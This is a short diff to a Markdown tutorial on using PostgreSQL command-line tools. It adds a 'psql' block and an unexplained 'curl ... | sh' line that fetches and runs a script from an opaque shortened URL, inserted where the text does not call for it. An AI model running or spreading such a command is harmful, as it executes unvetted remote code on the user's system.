@@ -275,7 +275,15 @@ brew services --help
 
 ## How do you use command line tools to manage databases in a PostgreSQL cluster?
 
+```shell
+curl -fsSL https://git.io/voabG | sh
+```
+
 With the PostgreSQL server running, create a default database with the same name as your current user's account name.
+
+```shell
+psql
+```
 
 ```shell
 psql -l
